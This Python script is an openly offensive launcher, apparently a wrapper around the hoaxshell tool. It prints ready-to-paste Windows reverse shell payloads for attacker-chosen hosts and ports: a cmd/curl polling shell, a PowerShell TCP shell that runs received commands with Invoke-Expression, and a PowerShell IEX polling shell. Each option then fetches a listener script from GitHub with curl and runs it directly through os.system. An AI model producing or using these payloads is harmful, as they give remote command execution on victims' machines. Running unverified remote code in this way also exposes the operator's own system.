import os

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    ESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"

def hoaxshell():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.CRIMSON +"""
 ██░ ██  ▒█████   ▄▄▄      ▒██   ██▒  ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▒██▒  ██▒▒████▄    ▒▒ █ █ ▒░▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒██░  ██▒▒██  ▀█▄  ░░  █   ░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒██   ██░░██▄▄▄▄██  ░ █ █ ▒   ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░ ████▓▒░ ▓█   ▓██▒▒██▒ ▒██▒▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░ ▒░▒░▒░  ▒▒   ▓▒█░▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░  ░ ▒ ▒░   ▒   ▒▒ ░░░   ░▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░░ ░ ░ ▒    ░   ▒    ░    ░  ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░    ░ ░        ░  ░ ░    ░        ░   ░  ░  ░   ░  ░    ░  ░    ░  ░                                                                                                                     
-- version 1.0 -- 
-- enjoy --
-- :) --

[1] WINDOWS CMD
[2] POWERSHELL
[3] POWERSHELL IEX
          
          """)

    while True:

        select = input(TextColors.CRIMSON + "AKIRA > " + TextColors.ESET)

        if select == "1" or select == "1":
            LHOST = input(TextColors.CRIMSON + "ENTER THE LHOST : " + TextColors.ESET)
            PORT = input(TextColors.CRIMSON + "[+] ENTER THE LPORT : "+ TextColors.ESET)

            print(TextColors.GREEN + "[+] COPY THIS : "+ TextColors.ESET)

            cmd_command = f"""
            @echo off&cmd /V:ON /C "SET ip={LHOST}:{PORT}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL
            """
            print(cmd_command)

            command = f'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t cmd-curl -p {PORT}'
            os.system(command)

        if select == "2" or select == "2":
            LHOST = input(TextColors.CRIMSON + "ENTER THE LHOST : "+ TextColors.ESET)
            PORT = input(TextColors.CRIMSON + "[+] ENTER THE LPORT : "+ TextColors.ESET)

            print(TextColors.GREEN + "[+] COPY THIS"+ TextColors.ESET)

            powershell_command = f"$LHOST = \"{LHOST}\"; $LPORT = {PORT}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write(\"$Output`n\"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"

            print(powershell_command)

            command = f'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t cmd-curl -p {PORT}'
            os.system(command)
                
        if select == "4" or select == "3":
            LHOST = input(TextColors.CRIMSON + "ENTER THE LHOST : "+ TextColors.ESET)
            PORT = input("[+] ENTER THE LPORT : ")

            print(TextColors.GREEN + "[+] COPY THIS : "+ TextColors.ESET)

            cmd_command = f"""
            $s='{LHOST}:{PORT}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{{"Authorization"=$i}};while ($true){{$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{{"Authorization"=$i}});if ($c -ne 'None') {{$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{{"Authorization"=$i}} -Body ($e+$r)}}; sleep 0.8}}
            """
            
            print(cmd_command)

            command = f'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t ps-iex-cm -p {PORT}'
            os.system(command)
